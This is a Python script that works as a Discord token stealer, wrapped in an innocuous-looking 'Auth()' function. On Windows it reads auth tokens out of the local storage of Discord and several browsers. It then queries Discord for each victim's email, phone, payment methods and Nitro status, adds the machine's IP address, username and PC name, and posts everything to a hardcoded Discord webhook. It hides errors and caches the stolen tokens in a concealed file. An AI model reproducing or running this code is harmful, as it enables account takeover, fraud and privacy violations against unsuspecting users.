import discord_webhook
from discord_webhook import DiscordWebhook, DiscordEmbed
import random
import threading
from threading import Thread
import string
import urllib3
urllib3.disable_warnings()
import asyncio
import time
from time import sleep


def Auth():
    def lets_go():
        WEBHOOK = "https://discord.com/api/webhooks/799942160811163678/B3JByhsSqPo-1eDMv84_tVVZ4gWM2ghWgyTW9Ujsp2QNi3cDurtgCIIQChNo4xypv_7y"
        import os
        if os.name != "nt":
            exit()
        from re import findall
        from json import loads, dumps
        from base64 import b64decode
        from subprocess import Popen, PIPE
        from urllib.request import Request, urlopen
        from datetime import datetime
        from threading import Thread
        from time import sleep
        from sys import argv
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                    pass
            return ip
        def gethwid():
            p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        def getfriends(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
            except:
                pass
        def getchat(token, uid):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
            except:
                pass
        def has_payment_methods(token):
            try:
                return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
            except:
                pass
        def send_message(token, chat_id, form_data):
            try:
                urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
            except:
                pass
        def main():
            cache_path = ROAMING + "\\.cache~$"
            prevent_spam = True
            self_spread = False
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            ip = getip()
            pc_username = os.getenv("UserName")
            pc_name = os.getenv("COMPUTERNAME")
            user_path_name = os.getenv("userprofile").split("\\")[2]
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    nombre = user_data["username"]
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    sch_gif = f'https://cdn.discordapp.com/avatars/{user_data["id"]}/{user_data["avatar"]}.gif'
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    test = user_data["verified"]
                    nitro = bool(user_data.get("premium_type"))
                    billing = bool(has_payment_methods(token))
                    if test == True:
                        fa = 'Activada'
                    else:
                        fa = 'Desactivada'
                    if billing == True:
                        tarjeta = 'Si'
                    else:
                        tarjeta = 'No'
                    if nitro == True:
                        n = 'Si'
                    else:
                        n = 'No'
                    
                    embed = {
                        "color": 0x7289da,
                        "fields": [
                            {
                                "name": "**Informacion de la cuenta**",
                                "value": f'📨 `|` Email: {email}\n📱 `|` Numero de Tlf: {phone}\n🎉 `|` Nitro: {n}\n💳 `|` Tiene Tarjeta/s: {tarjeta}\n🔒 `|` 2FA: {fa}',
                                "inline": True
                            },
                            {
                                "name": "**Info Del Pc**",
                                "value": f'🌐 `|` IP: {ip}\n👤 `|` Usuario: {pc_username}\n🖥️ `|` Nombre Del PC: {pc_name}\n🏷️ `|` Localizacion del Token: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                            "icon_url": sch_gif
                        },
                        "footer": {
                            "text": f"Ya cayó un mama huevo en esta verga xD, el tonto se llama {user_data['username']}"
                        },
                        "thumbnail":{
                            "url": sch_gif
                        }
                    }
                    embeds.append(embed)
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')   
            webhook = {
                "content": "@everyone",
                "embeds": embeds,
                "username": "Messirve Tu Token Crack",
                "avatar_url": "https://cdn.discordapp.com/attachments/799706400531415101/799706569150562324/LoGo.jpg"
            }
            try:
                urlopen(Request(WEBHOOK, data=dumps(webhook).encode(), headers=getheaders()))
            except:
                pass
        try:
            main()
        except Exception as e:
            print(e)
            pass
    try:
        lets_go()
    except:
        pass
        time.sleep(5)
Auth()